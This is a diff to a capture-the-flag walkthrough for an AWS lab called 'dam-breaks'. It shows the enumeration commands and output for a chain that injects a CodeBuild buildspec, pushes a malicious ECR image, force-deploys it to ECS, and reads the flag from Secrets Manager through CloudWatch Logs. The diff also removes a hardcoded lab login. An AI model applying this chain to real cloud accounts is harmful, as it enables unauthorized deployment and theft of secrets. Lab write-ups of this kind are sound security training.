@@ -104,54 +104,7 @@ export AWS_SESSION_TOKEN="IQoJ..."
 export AWS_DEFAULT_REGION="us-east-1"
 ```
 
-### Step 2-3 (Alternative): CLI-only Authentication
-
-If browser access is unavailable, obtain credentials entirely via CLI.
-
-Retrieve the Cognito configuration from the portal's `/config` endpoint:
-
-```bash
-PORTAL_URL="http://<portal-ip>"
-CONFIG=$(curl -s $PORTAL_URL/config)
-
-CLIENT_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['clientId'])")
-POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['poolId'])")
-IDENTITY_POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['identityPoolId'])")
-```
-
-Authenticate and exchange the JWT for temporary AWS credentials:
-
-```bash
-ID_TOKEN=$(aws cognito-idp initiate-auth \
-  --auth-flow USER_PASSWORD_AUTH \
-  --client-id "$CLIENT_ID" \
-  --auth-parameters USERNAME=j.park@ottercode.kr,PASSWORD=Otter2022! \
-  --region us-east-1 \
-  --query 'AuthenticationResult.IdToken' \
-  --output text)
-
-IDENTITY_ID=$(aws cognito-identity get-id \
-  --identity-pool-id "$IDENTITY_POOL_ID" \
-  --logins "cognito-idp.us-east-1.amazonaws.com/${POOL_ID}=$ID_TOKEN" \
-  --region us-east-1 \
-  --query 'IdentityId' \
-  --output text)
-
-CREDS=$(aws cognito-identity get-credentials-for-identity \
-  --identity-id "$IDENTITY_ID" \
-  --logins "cognito-idp.us-east-1.amazonaws.com/${POOL_ID}=$ID_TOKEN" \
-  --region us-east-1 \
-  --query 'Credentials')
-
-export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
-export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretKey'])")
-export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SessionToken'])")
-export AWS_DEFAULT_REGION="us-east-1"
-```
-
-> The portal performs this same sequence client-side. `initiate-auth` authenticates against the User Pool, `get-id` resolves the Identity Pool identity, and `get-credentials-for-identity` exchanges the JWT for temporary AWS credentials via `AssumeRoleWithWebIdentity`.
-
-### Step 2-4: Verify Identity
+### Step 2-3: Verify Identity
 
 ```bash
 aws sts get-caller-identity
@@ -176,7 +129,7 @@ You are now authenticated as `CollaboratorDeveloperRole` — a role with limited
 
 You have credentials. First question: what can this role actually do?
 
-The ARN from Step 2-4 gives you the role name immediately:
+The ARN from Step 2-3 gives you the role name immediately:
 
 ```
 arn:aws:sts::123456789012:assumed-role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx/CognitoIdentityCredentials
@@ -201,6 +154,21 @@ aws iam get-role-policy \
   --role-name "$ROLE_NAME" \
   --policy-name "dam-breaks-collaborator-policy-xxxxxxxx"
 ```
+
+Also check for managed policy attachments — a managed policy could grant permissions not visible in the inline policy:
+
+```bash
+aws iam list-attached-role-policies --role-name "$ROLE_NAME"
+```
+
+Output:
+```json
+{
+  "AttachedPolicies": []
+}
+```
+
+No managed policies attached. All permissions are in the inline policy above.
 
 The policy document tells you what the policy *allows on paper*. It is not a complete picture — SCPs, permission boundaries, and resource-level restrictions can silently block actions that look allowed. But scanning the document reveals something useful: `iam:SimulatePrincipalPolicy` is granted.
 
@@ -271,13 +239,13 @@ Output:
 |  ecs:ListClusters              |  allowed          |
 |  ecs:ListTasks                 |  allowed          |
 |  iam:AttachRolePolicy          |  implicitDeny     |
-|  iam:GetRolePolicy             |  allowed          |  ← can read any role's policy
+|  iam:GetRolePolicy             |  allowed          |  ← can read own role's policy
 |  iam:ListAttachedRolePolicies  |  allowed          |
 |  iam:ListRolePolicies          |  allowed          |
 |  iam:ListRoles                 |  implicitDeny     |
 |  iam:SimulatePrincipalPolicy   |  allowed          |
 |  logs:DescribeLogGroups        |  allowed          |
-|  logs:DescribeLogStreams       |  allowed          |
+|  logs:DescribeLogStreams        |  allowed          |
 |  logs:FilterLogEvents          |  allowed          |
 |  logs:GetLogEvents             |  allowed          |
 |  s3:ListAllMyBuckets           |  implicitDeny     |
@@ -365,33 +333,56 @@ Output:
 }
 ```
 
+Two projects: `qa` and `prod`. Inspect both — the QA project might share the same service role and environment variables as prod, making it a safer target to test the buildspec injection on first.
+
 ```bash
 aws codebuild batch-get-projects \
-  --names "dam-breaks-webapp-prod-build-xxxxxxxx" \
-  --region us-east-1
+  --names "dam-breaks-webapp-qa-build-xxxxxxxx" \
+  --region us-east-1 \
+  --query 'projects[0].{serviceRole:serviceRole,envVars:environment.environmentVariables}'
 ```
 
 Output:
 ```json
 {
-  "projects": [{
-    "environment": {
-      "environmentVariables": [
-        { "name": "REPOSITORY_URI", "value": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx" },
-        { "name": "AWS_DEFAULT_REGION", "value": "us-east-1" },
-        { "name": "ECS_CLUSTER",  "value": "dam-breaks-prod-cluster-xxxxxxxx" },
-        { "name": "ECS_SERVICE",  "value": "dam-breaks-webapp-service-xxxxxxxx" },
-        { "name": "SECRET_ARN",   "value": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverpay/prod/flag-xxxxxxxx" }
-      ]
-    },
-    "serviceRole": "arn:aws:iam::123456789012:role/dam-breaks-CodeBuildProdServiceRole-xxxxxxxx"
-  }]
+  "serviceRole": "arn:aws:iam::123456789012:role/dam-breaks-CodeBuildProdServiceRole-xxxxxxxx",
+  "envVars": [
+    { "name": "REPOSITORY_URI",    "value": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx" },
+    { "name": "AWS_DEFAULT_REGION","value": "us-east-1" }
+  ]
 }
 ```
 
-`ECS_CLUSTER`, `ECS_SERVICE`, `SECRET_ARN` — all exposed in the project configuration. These are available as environment variables inside any build that runs under this project, even when the entire buildspec is replaced via `buildspecOverride`.
+QA uses the same service role — same `ecr:PutImage` permissions. But it has no `ECS_CLUSTER`, `ECS_SERVICE`, or `SECRET_ARN` env vars. A buildspec injected into QA cannot force-deploy to ECS or reference the flag ARN. The prod project must be used.
 
-The service role ARN is also exposed: `dam-breaks-CodeBuildProdServiceRole-xxxxxxxx`. The attack plan depends on this role having `ecr:PutImage` — the Collaborator role cannot push directly. Verify before committing to the approach.
+```bash
+aws codebuild batch-get-projects \
+  --names "dam-breaks-webapp-prod-build-xxxxxxxx" \
+  --region us-east-1 \
+  --query 'projects[0].{serviceRole:serviceRole,envVars:environment.environmentVariables,privilegedMode:environment.privilegedMode}'
+```
+
+Output:
+```json
+{
+  "serviceRole": "arn:aws:iam::123456789012:role/dam-breaks-CodeBuildProdServiceRole-xxxxxxxx",
+  "envVars": [
+    { "name": "REPOSITORY_URI", "value": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx" },
+    { "name": "AWS_DEFAULT_REGION", "value": "us-east-1" },
+    { "name": "ECS_CLUSTER",  "value": "dam-breaks-prod-cluster-xxxxxxxx" },
+    { "name": "ECS_SERVICE",  "value": "dam-breaks-webapp-service-xxxxxxxx" },
+    { "name": "SECRET_ARN",   "value": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverpay/prod/flag-xxxxxxxx" }
+  ],
+  "privilegedMode": true
+}
+```
+
+Three things confirmed at once:
+- `ECS_CLUSTER`, `ECS_SERVICE`, `SECRET_ARN` — all exposed, available inside any build even when buildspec is fully replaced via `buildspecOverride`
+- Service role ARN — the attack depends on this role having `ecr:PutImage`
+- `privilegedMode: true` — Docker commands will work inside the build environment; `false` would cause `docker build` to fail immediately
+
+Verify the service role has `ecr:PutImage` — the Collaborator role cannot push directly, so this is a hard requirement:
 
 ```bash
 CODEBUILD_ROLE_NAME="dam-breaks-CodeBuildProdServiceRole-xxxxxxxx"
@@ -444,7 +435,7 @@ Output:
 ]
 ```
 
-`ecr:PutImage` confirmed. CodeBuild can push the malicious image. `ecs:UpdateService` is also present — the `post_build` force-deploy call will succeed without touching the Collaborator role's permissions at all.
+`ecr:PutImage` confirmed. `ecs:UpdateService` also present — the `post_build` force-deploy call succeeds without touching the Collaborator role's permissions at all.
 
 One more check before moving on: does the CodeBuild service role have `secretsmanager:GetSecretValue` directly? If yes, the flag can be read straight from the buildspec — no ECS needed.
 
@@ -525,22 +516,27 @@ aws ecs describe-services \
   --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
   --services "dam-breaks-webapp-service-xxxxxxxx" \
   --region us-east-1 \
-  --query 'services[0].{deploymentController:deploymentController,circuitBreaker:deploymentConfiguration.deploymentCircuitBreaker}'
+  --query 'services[0].{deploymentController:deploymentController,circuitBreaker:deploymentConfiguration.deploymentCircuitBreaker,desiredCount:desiredCount,runningCount:runningCount,taskDefinition:taskDefinition}'
 ```
 
 Output:
 ```json
 {
   "deploymentController": { "type": "ECS" },
-  "circuitBreaker": { "enable": false, "rollback": false }
+  "circuitBreaker": { "enable": false, "rollback": false },
+  "desiredCount": 1,
+  "runningCount": 1,
+  "taskDefinition": "arn:aws:ecs:us-east-1:123456789012:task-definition/dam-breaks-webapp-xxxxxxxx:1"
 }
 ```
+
+`desiredCount: 1` — `force-new-deployment` will actually start a new task. If `desiredCount: 0`, the deployment triggers but no container ever runs. The `taskDefinition` ARN gives the family name needed for the next call.
 
 ```bash
 aws ecs describe-task-definition \
   --task-definition "dam-breaks-webapp-xxxxxxxx" \
   --region us-east-1 \
-  --query 'taskDefinition.{taskRoleArn:taskRoleArn,image:containerDefinitions[0].image,logConfig:containerDefinitions[0].logConfiguration}'
+  --query 'taskDefinition.{taskRoleArn:taskRoleArn,image:containerDefinitions[0].image,logConfig:containerDefinitions[0].logConfiguration,environment:containerDefinitions[0].environment}'
 ```
 
 Output:
@@ -555,14 +551,19 @@ Output:
       "awslogs-region": "us-east-1",
       "awslogs-stream-prefix": "ecs"
     }
-  }
+  },
+  "environment": [
+    { "name": "NODE_ENV",           "value": "production" },
+    { "name": "AWS_DEFAULT_REGION", "value": "us-east-1" }
+  ]
 }
 ```
 
-Three things confirmed at once:
+Four things confirmed at once:
 - Task role ARN for permission verification
 - Image references `:latest` → overwriting `:latest` in ECR will be picked up on the next deploy
 - Log group name `/ecs/dam-breaks-webapp-xxxxxxxx` — this is where the container's stdout goes, needed in Step 9
+- No secrets hardcoded in container environment variables — the full ECR → ECS → CloudWatch Logs attack chain is required
 
 Record the current running task ARN to know which task is new after the attack:
 
@@ -581,6 +582,29 @@ Output:
   ]
 }
 ```
+
+Describe the current task to confirm the container has outbound network access — the malicious container needs to reach AWS APIs (Secrets Manager, CloudWatch Logs):
+
+```bash
+aws ecs describe-tasks \
+  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
+  --tasks "arn:aws:ecs:us-east-1:123456789012:task/dam-breaks-prod-cluster-xxxxxxxx/aabb1122ccdd" \
+  --region us-east-1 \
+  --query 'tasks[0].attachments[0].details'
+```
+
+Output:
+```json
+[
+  { "name": "subnetId",           "value": "subnet-xxxxxxxx" },
+  { "name": "networkInterfaceId", "value": "eni-xxxxxxxx" },
+  { "name": "macAddress",         "value": "xx:xx:xx:xx:xx:xx" },
+  { "name": "privateIPv4Address", "value": "10.10.1.x" },
+  { "name": "publicIPv4Address",  "value": "3.x.x.x" }
+]
+```
+
+`publicIPv4Address` is assigned — the task runs in a public subnet with outbound internet access. AWS API calls from inside the container will succeed.
 
 A Task Role ARN alone proves nothing. The plan requires this role to have `secretsmanager:GetSecretValue` on the specific flag secret — if it doesn't, the container deploys and silently fails. Verify directly.
 
@@ -629,11 +653,29 @@ Output:
 
 `secretsmanager:GetSecretValue` is granted on the flag secret ARN. The container will inherit these credentials automatically via `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — no configuration needed inside the container.
 
+Before committing to the full attack, scan the existing CloudWatch logs from the legitimate running container. If the app already prints the secret to stdout, the ECR injection is unnecessary.
+
+```bash
+aws logs filter-log-events \
+  --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
+  --filter-pattern "secret OR password OR key OR flag" \
+  --region us-east-1 \
+  --query 'events[*].message'
+```
+
+Output:
+```json
+[]
+```
+
+No sensitive output from the legitimate container. The full ECR → ECS → CloudWatch Logs attack chain is required.
+
 Key findings:
 - Rolling deployment (`ECS`) — no manual approval gate, new image deploys automatically
 - Circuit breaker disabled — a failed container will not auto-rollback or trigger alerts
 - `:latest` tag referenced — overwriting ECR `:latest` triggers deployment immediately
 - Task Role has `secretsmanager:GetSecretValue` on the flag ARN — verified
+- Existing logs contain no secrets — ECR injection is the only path
 
 All prerequisites confirmed. The attack chain is viable end-to-end.
 
@@ -782,34 +824,13 @@ Output:
 }
 ```
 
-The image tag is `:latest` — this is the replaced image. The task ID is different from the one recorded in Step 6, confirming a new container started after the deployment.
+The task ID is different from the one recorded in Step 6, confirming a new container started after the deployment.
 
 ---
 
 ## Step 9: FLAG Extraction via CloudWatch Logs
 
-The container started, called `secretsmanager:GetSecretValue`, and wrote the result to stdout. The log group name was discovered in Step 6 from the task definition's `logConfiguration`.
-
-Confirm the log group is reachable:
-
-```bash
-aws logs describe-log-groups \
-  --log-group-name-prefix "/ecs/dam-breaks-webapp" \
-  --region us-east-1 \
-  --query 'logGroups[*].{name:logGroupName,retentionDays:retentionInDays}'
-```
-
-Output:
-```json
-[
-  {
-    "name": "/ecs/dam-breaks-webapp-xxxxxxxx",
-    "retentionDays": null
-  }
-]
-```
-
-Find the log stream created by the new container. The newest stream is the malicious one — streams are named `ecs/<container-name>/<task-id>`:
+The container started, called `secretsmanager:GetSecretValue`, and wrote the result to stdout. The log group `/ecs/dam-breaks-webapp-xxxxxxxx` was discovered in Step 6 from the task definition. Find the log stream created by the new container. The newest stream is the malicious one — streams are named `ecs/<container-name>/<task-id>`:
 
 ```bash
 aws logs describe-log-streams \
